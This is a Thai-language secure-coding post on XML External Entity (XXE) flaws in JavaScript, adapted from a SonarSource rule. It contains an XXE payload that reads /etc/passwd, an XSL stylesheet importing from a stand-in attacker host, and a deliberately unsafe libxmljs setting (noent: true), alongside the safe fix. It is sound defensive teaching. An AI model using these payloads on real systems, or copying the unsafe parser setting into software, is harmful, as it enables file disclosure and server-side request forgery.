# [Code4Sec Week](https://www.facebook.com/hashtag/code4sec) / Day 4 - XML External Entities (XXE) in JavaScript.
[#NEIS0736](https://www.facebook.com/hashtag/neis0736) [#NECS0736](https://www.facebook.com/hashtag/necs0736)

![JavaScript](/images/JS.gif)

## XML parsers should not be vulnerable to XXE attacks

[XML specification](https://www.w3.org/TR/xml/) อนุญาตให้ใช้ entities ที่เป็น [internal](https://www.w3.org/TR/xml/#sec-internal-ent) หรือ [external](https://www.w3.org/TR/xml/#sec-external-ent) (file system / network access ...) ซึ่งอาจนำไปสู่ช่องโหว่เช่น ไฟล์ชั้นความลับถูกเปิดเผย หรือ [SSRFs](https://www.owasp.org/index.php/Server_Side_Request_Forgery).

ตัวอย่างในไฟล์ XML นี้ entity ภายนอกสามารถอ่านไฟล์ /etc/passwd ได้:

```
<?xml version="1.0" encoding="utf-8"?>
  <!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
<note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <to>&xxe;</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

ในไฟล์ XSL นี้อนุญาตให้เครือข่ายเข้าถึงได้ ซึ่งอาจนำไปสู่ช่องโหว่ SSRF :

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.attacker.com/evil.xsl">
  <xsl:import href="http://www.attacker.com/evil.xsl"/>
  <xsl:include href="http://www.attacker.com/evil.xsl"/>
 <xsl:template match="/">
  &content;
 </xsl:template>
</xsl:stylesheet>
It is recommended to disable access to external entities and network access in general.
```

**ตัวอย่างที่ไม่ปลอดภัย**

[libxmljs](https://github.com/libxmljs/libxmljs) module:

```
const libxmljs = require("libxmljs");
var fs = require('fs');

var xml = fs.readFileSync('xxe.xml', 'utf8');

var xmlDoc = libxmljs.parseXmlString(xml, { noblanks: true, noent: true, nocdata: true }); // Noncompliant: noent set to true
```

**แนวทางแก้ไขที่ถูกต้อง**

[libxmljs](https://github.com/libxmljs/libxmljs) module:

```
const libxmljs = require("libxmljs");
var fs = require('fs');

var xml = fs.readFileSync('xxe.xml', 'utf8');

var xmlDoc = libxmljs.parseXmlString(xml); // Compliant: noent set to false by default
```

**เพิ่มเติม**

* [OWASP Top 10 2017 Category A4](https://www.owasp.org/index.php/Top_10-2017_A4-XML_External_Entities_(XXE)) - XML External Entities (XXE)
* [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [MITRE, CWE-611](http://cwe.mitre.org/data/definitions/611.html) - Information Exposure Through XML External Entity Reference
* [MITRE, CWE-827](http://cwe.mitre.org/data/definitions/827.html) - Improper Control of Document Type Definition

**แหล่งที่มา**

[<img src="/images/SonarSourceRules.svg" alt="SonarQube" height="50">](https://rules.sonarsource.com/javascript/RSPEC-2755)
